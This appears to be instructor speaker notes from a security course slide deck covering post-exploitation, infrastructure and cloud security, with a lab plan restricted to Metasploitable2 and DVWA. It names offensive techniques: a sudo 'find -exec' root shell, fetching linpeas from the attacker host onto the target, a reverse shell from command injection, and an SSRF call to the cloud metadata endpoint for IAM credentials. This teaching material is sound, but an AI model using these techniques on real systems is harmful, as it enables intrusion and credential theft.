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TWO-PART DAY — two disciplines. Treat it as such:
  PART 1 — post-exploitation (through the attack-chain artifact).  target: DONE by minute 48.
  PART 2 — infrastructure + cloud.
  &gt;&gt;&gt; MID-POINT GATE at minute 48: if the priv-esc DO ran long and you're not at "the attack
      chain" slide, drop persistence/lateral/pivot to a 90-second name-check, do the attack
      chain, then Part 2 becomes: infra = a 4-min bullet run, shared responsibility (full),
      the bucket/IAM DO is homework. NEVER cut shared responsibility or the attack-chain artifact.
00:00 Journey check + hook (low-priv -&gt; root in 20s)           4   ┐
00:04 What a shell is + the post-ex goals                      5   │
00:09 Privilege escalation                                    10   │ PART 1
00:19 DO: shell -&gt; priv-esc — Path A (MS2) or B (DVWA webshell) 16   │ (post-ex,
00:35 Persistence / lateral movement / pivoting                8   │  done by :48)
00:43 The attack chain + detection opportunities               7   ┘
00:50 Infrastructure security                                  8   ┐
00:58 Cloud security — shared responsibility                   8   │ PART 2
01:06 DO: fix an open bucket / IAM policy                     10   │ (infra + cloud)
01:16 Attack &lt;-&gt; defence + wrap + homework                     4   ┘
CUT FIRST IF SHORT: persistence/lateral/pivot slide to 4 min; infra slide to a 4-min bullet run.
NEVER CUT: privilege escalation + the priv-esc DO (Path A or B — pick ONE per class, don't run
both in the 16 min unless clearly ahead of schedule), the attack-chain-with-detection artifact,
shared responsibility, the bucket/IAM DO.
ANALOGY (kitchen): post-ex = you're inside after hours. Get the master key (priv-esc), prop a
door for later (persistence), move kitchen -&gt; office -&gt; safe (lateral movement), use the
restaurant's van to reach the warehouse (pivoting). Cloud = a chain of restaurants sharing one
supplier who says "we lock the building; what's in your unit is your problem".
ETHICS: Metasploitable2 / assigned lab target only (the ROE). Post-ex stays on that box.
Own lab: Metasploitable2 `10.89.1.10`, DVWA `10.89.1.20` for the web-shell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Check. Getting a shell is the START of the interesting part, not the end. This is
lifecycle Phase 5 (post-exploitation).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`find` can run commands (`-exec`), and `sudo` runs it as root -&gt; instant root shell. This is a
GTFOBins classic (Day 7). Land it: "the exploit got them a low-priv shell; THIS is how it
becomes game over."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Metasploit gives you a `meterpreter` session (a feature-rich agent) or a plain `shell`.
The goals list = the rest of today. "Quietly" = the whole reason Day 19 (Blue team)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automate the hunt: `linpeas.sh` / `linenum.sh` (Linux), `winPEAS` / `PowerUp` (Windows).
They dump everything interesting; you spot the path. Kernel exploits are last resort (can
crash the box).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min. Path A: Metasploitable2 has many escalation routes — `distcc`/`udev`/`nfs`, an old
kernel, world-writable cron. Coach the same way as Day 15.
linpeas: `wget http://&lt;your-kali&gt;/linpeas.sh` on the target (host it with `python3 -m http.server`).
Path B is the Day-16 command-injection bug taken one step further: same bug, this time used
to open a shell instead of just proving RCE with `whoami`. It's the shortest, clearest 'a web
bug became a backdoor' demo in the whole course — use it if the class is behind on Metasploit.
Non-root -&gt; root (Path A) or a live reverse shell (Path B) is the proof. This is Phase 5 of the
engagement journal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a flat internal network is dangerous - one workstation compromise reaches the
database, the DC, everything. Segmentation (next) breaks the chain.
CUT to 4 min if behind - name the three, one line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ARTIFACT. Students draw their own version: the chain + one thing a SOC could see
at each step. It's the bridge from Red to Blue and the reason "assume breach" (Day 10)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theme: the internal network is not "trusted" just because it's internal (assume breach).
Segmentation is the single highest-value control against lateral movement.
CUT to a 4-min bullet run if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shifts by service model: with a managed database (PaaS) the provider patches the DB;
with a VM (IaaS) you do. The CONSTANT is: identity, access config, and data are always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SSRF callback: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` returns
temporary creds for whatever role the instance has. If that role is over-privileged, the SSRF
becomes account takeover. IMDSv2 mitigates; least-privilege roles are the real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whole lab runs on containers (DVWA, Juice Shop) — point that out. The one idea to land:
"a container is not a VM; the kernel is shared; treat it like a process with extra packaging."
Kubernetes adds RBAC, network policies, admission control — name it as "the same questions at
cluster scale", Day 20 careers has a cloud/container path.
CUT ENTIRELY if behind — it's marked as reading; the homework points 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min, paper exercise (no cloud account needed). If you have LocalStack / MinIO set up, do it
live against a real bucket. Answer key in teacher-notes.
The skill: reading a policy and spotting "this grants far more than the app needs".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through-line: least privilege + segmentation + monitoring. Every row is one of those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the newest frontier - AI and cyber security. AI as a target, a
weapon, and a defender's tool. You'll prompt-inject a vulnerable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17 — Post-Exploitation + Infrastructure &amp; Cloud</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Created by Marp</dc:creator>
  <cp:lastModifiedBy>Created by Marp</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-09-26T08:51:46Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-26T08:51:46Z</dcterms:modified>
</cp:coreProperties>
</file>